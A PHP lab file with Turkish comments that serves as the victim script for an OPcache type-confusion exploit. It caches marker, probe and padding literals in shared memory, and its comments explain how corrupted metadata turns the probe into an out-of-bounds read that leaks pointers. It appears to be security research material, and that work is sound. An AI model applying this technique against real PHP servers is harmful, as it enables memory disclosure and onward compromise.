<?php
/**
 * Bug 4 Lab: Victim Script (OPcache'de cache'lenir)
 *
 * Bu script, SHM'de bilinen literal degerlerle cache'lenir.
 * Type confusion sonrasi literal'in tipi/boyutu bozulursa,
 * okuma OOB (out-of-bounds) olur ve komsudaki SHM verisini sizdirir.
 *
 * Exploit, bu script'i calistirarak confused literal uzerinden
 * SHM icindeki pointer'lari okur (Phase 4: OOB Read).
 *
 * SADECE LAB.
 */

// ---- Kontrol edilebilir literal'ler ----
// Bu string'ler OPcache SHM'de art arda saklanir.
// Exploit, OOM ile bunlarin metadata'sini (len/type) bozar.

// MARKER: exploit bu string'i response'ta arar
$marker = "OPCACHE_VICTIM_MARKER_7f7f7f7f";

// PROBE literal: tam 64 byte (SHM allocation unit ile hizali).
// Type confusion olursa PHP bu 64 byte'i HashTable olarak okur
// ve arData (offset 0x20) "pointer"ini takip eder → OOB read.
$probe = str_repeat("\x41", 64);

// PADDING: victim ile sonraki SHM entry arasini doldurmak icin.
// Ne kadar cok literal varsa, SHM'deki ayak izi o kadar buyuk
// ve confusion yuzeyi o kadar genis.
$pad1 = str_repeat("\x42", 128);
$pad2 = str_repeat("\x43", 128);
$pad3 = str_repeat("\x44", 128);
$pad4 = str_repeat("\x45", 128);

// ---- Script ciktisi ----
// Normal calistiginda marker'i + probe'u hex olarak doner.
// Confused calistiginda probe, bozuk metadata ile okunur ve
// response'ta SHM icerigi gozukur.
header('Content-Type: text/plain');
echo "MARKER:" . $marker . "\n";
echo "PROBE_HEX:" . bin2hex($probe) . "\n";
echo "PROBE_LEN:" . strlen($probe) . "\n";
echo "PROBE_TYPE:" . gettype($probe) . "\n";

// probe'u array olarak kullanmayi dene: confusion varsa
// PHP burada string'i array sanir ve icindekileri doner
if (is_array($probe)) {
    echo "CONFUSION:YES\n";
    echo "ARRAY_COUNT:" . count($probe) . "\n";
    // Her eleman SHM'den okunan ham veri
    foreach ($probe as $k => $v) {
        echo "EL:" . bin2hex(substr((string)$v, 0, 64)) . "\n";
    }
} else {
    echo "CONFUSION:NO\n";
}
